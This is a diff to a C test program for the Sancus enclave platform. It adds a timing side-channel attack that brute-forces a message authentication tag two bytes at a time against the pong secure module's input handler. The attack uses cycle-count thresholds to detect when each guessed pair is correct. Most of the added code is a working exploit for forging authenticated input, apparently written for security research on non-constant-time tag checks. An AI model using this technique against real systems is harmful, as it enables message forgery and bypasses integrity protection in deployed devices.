@@ -3,9 +3,12 @@
 #include <sancus/sm_support.h>
 #include <sancus/reactive.h>
 #include <sancus_support/sm_io.h>
+#include <sancus_support/timer.h>
+#include <sancus_support/tsc.h>
 
 #define CONN_ID 0
 #define AD_SIZE 6
+#define DATA_SIZE 2
 // NOTE: because of a known bug in the Sancus crypto engine, manually align buffers here
 uint8_t __attribute__((aligned(2))) cipher[SANCUS_KEY_SIZE];
 uint8_t __attribute__((aligned(2))) tag[SANCUS_TAG_SIZE];
@@ -102,6 +105,42 @@ int main()
     puts("\n---");
     puts("[untrusted] calling ping SM..");
     enter_ping();
+
+    uint tsc1, tsc2;
+    timer_tsc_start();
+    tsc1 = timer_tsc_end();
+    pr_info1("tsc overhead: %u\n", tsc1);
+    uint8_t __attribute__((aligned(2))) cipher[DATA_SIZE] = {0xAA, 0xBB};
+    uint8_t __attribute__((aligned(2))) guess[DATA_SIZE + SANCUS_TAG_SIZE] = {0x0};
+    
+    for( int i = 0; i < DATA_SIZE; i++ ){
+        guess[i] = cipher[i];
+    }
+
+    for ( int e = 0; e < SANCUS_TAG_SIZE/2; e++ ){
+        for( int i = 0; i < 256; i++ ){
+            guess[DATA_SIZE+2*e] = i;
+            for( int j = 0; j < 256; j++ ){
+                guess[DATA_SIZE+2*e+1] = j;
+                
+                timer_tsc_start();
+                __sm_pong_handle_input(CONN_ID, guess, DATA_SIZE + SANCUS_TAG_SIZE);
+                tsc2 = timer_tsc_end();
+                if( tsc2 > 2211 + e*173 ){
+                    // dump_buf(guess, DATA_SIZE+SANCUS_TAG_SIZE, "\tguess");
+                    // pr_info1("Time to verify guess: %u\n", tsc2);
+                    break;
+                }
+            }
+            // pr_info1("Finished %d/256\n", i+1);
+            if( tsc2 > 2211 + e*173 ){
+                // dump_buf(guess, DATA_SIZE+SANCUS_TAG_SIZE, "\tguess");
+                // pr_info1("Time to verify guess: %u\n", tsc2);
+                break;
+            }
+        }
+        pr_info1("Finished %d/8\n", e+1);
+    }
 
     FINISH();
 }
